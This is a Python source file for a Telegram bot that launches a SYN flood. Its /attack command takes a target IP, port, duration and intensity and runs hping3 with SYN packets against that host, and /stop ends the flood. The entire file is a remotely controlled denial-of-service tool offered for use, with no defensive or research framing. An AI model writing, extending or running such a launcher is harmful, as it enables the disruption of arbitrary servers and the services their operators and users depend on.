import subprocess
import threading
import time
import logging
from queue import Queue
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from telegram import Update

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Replace with your bot token
TOKEN = 'YOUR_BOT_TOKEN'

attack_process = None
attack_thread = None

def start_attack(ip, port, duration, intensity=1000000):
    global attack_process, attack_thread
    if attack_process is None or attack_process.poll() is not None:
        attack_process = subprocess.Popen(['hping3', '-S', '-p', str(port), '-c', str(int(duration * intensity / 60)), '-d', '120', '-w', '64', ip])
        attack_thread = threading.Thread(target=monitor_attack, args=(attack_process, duration))
        attack_thread.start()
        return True
    else:
        return False

def monitor_attack(process, duration):
    start_time = time.time()
    while process.poll() is None and time.time() - start_time < duration * 60:
        time.sleep(1)
    if process.poll() is None:
        process.terminate()
        process = None

def stop_attack():
    global attack_process, attack_thread
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        attack_process = None
        if attack_thread and attack_thread.is_alive():
            attack_thread.join()
        return True
    else:
        return False

def attack_command(bot, update, args):
    if len(args) < 3 or len(args) > 4:
        update.message.reply_text('Usage: /attack <ip> <port> <duration_in_minutes> [intensity]')
        return

    ip = args[0]
    port = args[1]
    duration = args[2]
    intensity = args[3] if len(args) == 4 else 1000000

    try:
        port = int(port)
        duration = int(duration)
        intensity = int(intensity)
    except ValueError:
        update.message.reply_text('Port, duration, and intensity must be integers.')
        return

    if start_attack(ip, port, duration, intensity):
        update.message.reply_text(f'Attack started on {ip}:{port} for {duration} minutes with intensity {intensity}.')
    else:
        update.message.reply_text('Attack is already running.')

def stop_command(bot, update):
    if stop_attack():
        update.message.reply_text('Attack stopped.')
    else:
        update.message.reply_text('No attack is currently running.')

def error_handler(bot, update, error):
    logger.error(f'Update {update} caused error {error}')
    update.message.reply_text('An error occurred. Please try again.')

def main():
    # Create an update queue
    update_queue = Queue()

    updater = Updater(TOKEN, update_queue=update_queue)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('attack', attack_command, pass_args=True))
    dispatcher.add_handler(CommandHandler('stop', stop_command))
    dispatcher.add_error_handler(error_handler)

    updater.start_polling()
    logger.info('Bot started. Press Ctrl+C to stop.')
    updater.idle()

if __name__ == '__main__':
    main()